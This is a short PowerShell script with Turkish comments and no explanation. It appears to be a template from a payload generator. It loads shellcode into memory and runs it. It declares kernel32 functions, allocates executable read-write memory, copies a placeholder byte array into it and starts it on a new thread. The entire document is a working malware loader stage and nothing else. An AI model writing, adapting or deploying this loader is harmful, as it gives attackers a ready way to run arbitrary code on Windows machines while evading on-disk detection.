[Byte[]] $data = @({{SHELLCODE_PLACEHOLDER}})

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll")]
    public static extern UInt32 RtlZeroMemory(
        IntPtr dest,
        UInt32 size
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId
    );

    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
    );
}
"@

Add-Type $Kernel32

# Bellek ayır
$size = $data.Length
$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)

# Belleği sıfırla (opsiyonel)
[Win32]::RtlZeroMemory($addr, [uint32]$size)

# Shellcode'u belleğe kopyala
[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, $size)

# Thread oluştur
$threadId = 0
$hThread = [Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)

# Thread bitene kadar bekle (INFINITE)
$INFINITE = [uint32]::MaxValue
[Win32]::WaitForSingleObject($hThread, $INFINITE)
